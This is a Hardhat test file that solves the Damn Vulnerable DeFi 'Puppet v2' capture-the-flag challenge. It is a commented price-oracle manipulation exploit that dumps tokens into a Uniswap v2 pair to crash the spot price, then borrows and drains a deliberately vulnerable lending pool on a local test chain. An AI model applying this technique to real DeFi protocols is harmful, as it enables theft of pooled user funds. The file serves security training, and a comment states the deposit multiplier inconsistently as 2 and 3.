const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Puppet v2', function () {
    let deployer, attacker;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x1158e460913d00000", // 20 ETH
        ]);
        expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther('20'));

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        this.uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        this.uniswapRouter = await UniswapRouterFactory.deploy(
            this.uniswapFactory.address,
            this.weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await this.token.approve(
            this.uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapRouter.addLiquidityETH(
            this.token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        this.uniswapExchange = await UniswapPairFactory.attach(
            await this.uniswapFactory.getPair(this.token.address, this.weth.address)
        );
        expect(await this.uniswapExchange.balanceOf(deployer.address)).to.be.gt('0');

        // Deploy the lending pool
        this.lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            this.weth.address,
            this.token.address,
            this.uniswapExchange.address,
            this.uniswapFactory.address
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('0.3'));
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(ethers.utils.parseEther('300000'));
    });

    // ------------------------------------------ EXPLOIT ------------------------------------------
    // 1. Swap all but 1 DVT to ETH using the Uniswap pool to push the ETH/DVT price down
    //      - Attacker now has 29.9 ETH and 1 DVT post swap
    //      - Uniswap pool now has 0.1 ETH and 10099 DVT
    // 2. Attacker calls 'borrow()' while the oracle price for ETH/DVT is low and drains lending pool
    //      - depositAmount = borrowAmount * ETH/DVT price * 2
    //      - depositAmount = (1,000,000 DVT) * (0.1 ETH / 10099 DVT) * 3
    //      - depositAmount = ~29.5 ETH 
    // ---------------------------------------------------------------------------------------------
    it('Exploit', async function () {
        // Amount of WETH needed to borrow all DVT from the lending pool
        const depositAmountBefore = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);

        console.log(`
            Initial Uniswap pool balances: ${ethers.utils.formatEther(UNISWAP_INITIAL_WETH_RESERVE)} WETH | ${ethers.utils.formatEther(UNISWAP_INITIAL_TOKEN_RESERVE)} DVT
            Initial attacker balances: 20 ETH | 10,000 DVT
            
            WETH needed to drain lending pool (pre swap): ${ethers.utils.formatEther(depositAmountBefore)}
        `);

        // Approve Uniswap router
        await this.token.connect(attacker).approve(this.uniswapRouter.address, ethers.constants.MaxUint256);
        const swapAmount = ATTACKER_INITIAL_TOKEN_BALANCE.sub(ethers.constants.WeiPerEther);

        // Swap all but 1 DVT for WETH using the Uniswap router
        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
            swapAmount,
            0,
            [this.token.address, this.weth.address],
            attacker.address,
            999999999999999
        );

        // Get ETH balance of the attacker post swap
        const ethAmountAfter = await ethers.provider.getBalance(attacker.address);
    
        const amountOut = ethAmountAfter.sub(ethers.utils.parseEther("20"));
        const uniswapTokenBalance = ethers.utils.formatEther(UNISWAP_INITIAL_TOKEN_RESERVE.add(swapAmount));
        const uniswapEthBalance = ethers.utils.formatEther(UNISWAP_INITIAL_WETH_RESERVE.sub(amountOut));

        console.log(`
            Swapping ${ethers.utils.formatEther(swapAmount)} DVT for ${ethers.utils.formatEther(amountOut)} ETH
            
            Uniswap pool balances: ${uniswapEthBalance} WETH | ${uniswapTokenBalance} DVT
            Attacker balances: ${ethers.utils.formatEther(ethAmountAfter)} ETH | 1 DVT
        `);

        // Calculate new amount of WETH needed to borrow all DVT from lending pool
        // Ensure that the lending pool deposit amount has decreased
        const depositAmountAfter = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        expect(depositAmountAfter).to.be.lt(depositAmountBefore);
        
        // Ensure that the attacker has enough ETH to drain the lending pool
        expect(ethAmountAfter).to.be.gt(depositAmountAfter);
        
        console.log(` 
            WETH needed to drain lending pool (post swap): ${ethers.utils.formatEther(depositAmountAfter)}
        `);

        // Convert ETH to WETH and approve the lending pool
        await this.weth.connect(attacker).deposit({value: depositAmountAfter});
        await this.weth.connect(attacker).approve(this.lendingPool.address, ethers.constants.MaxUint256);

        // Drain lending pool of all DVT
        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});